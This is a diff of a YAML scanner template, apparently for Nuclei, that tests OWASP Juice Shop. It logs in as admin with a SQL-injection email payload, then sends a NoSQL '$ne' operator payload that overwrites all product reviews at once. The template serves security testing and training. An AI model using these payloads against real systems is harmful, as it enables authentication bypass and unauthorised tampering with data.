@@ -1,52 +1,61 @@
-id: nosql_injection
+id: juice-shop-nosql-manipulation
 
 info:
-  name: NoSQL Injection in Juice Shop
-  author: your_name
+  name: NoSQL Manipulation
+  author: yelaco
   severity: high
-  description: Attempting NoSQL Injection in product reviews.
-
-flow: |
-  http(1) && http(2)
+  tags: juice-shop,nosqli,review
+  description: Update multiple product reviews at the same time
 
 requests:
-  - raw:
-      - |
-        POST /rest/user/login HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
-        Accept: application/json, text/plain, */*
-        Content-Type: application/json
+  # Step 1: Login via SQL Injection to get token
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
 
-        {"email":"trycyber@gmail.com","password":"trycyber"}
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "email": "admin@juice-sh.op'--",
+        "password": "irrelevant"
+      }
 
     extractors:
-      - type: regex
+      - type: json
+        json:
+          - ".authentication.token"
+        internal: true # Makes the extracted value available to the next request
         name: token
-        internal: true
-        group: 1
-        regex:
-          - '"token"\s*:\s*"([^"]+)"'
 
-  - raw:
-      - |
-        PATCH /rest/products/reviews HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Bearer {{token}}
-        Cookie: language=en; token={{token}}
-        Content-Type: application/json
+  # Step 2: Use token in Authorization header and update product reviews
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/rest/products/reviews"
 
-        {"id":{"$ne": null},"message":"change_all_reviewsss\n"}
+    headers:
+      Authorization: Bearer {{token}}
+      Content-Type: application/json
+
+    body: |
+      {
+        "id": { "$ne": -1 },
+        "message": "NoSQL Injection!"
+      }
 
     matchers:
-          - type: status
-            status:
-              - 200
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "NoSQL Injection!"
 
-          - type: word
-            words:
-              - "change_all_reviewsss"
-            part: body
-
-
-
+    extractors:
+      - type: json
+        part: body
+        name: updated_reviews
+        json:
+          - ".updated | .[] | {_id, author, message}"
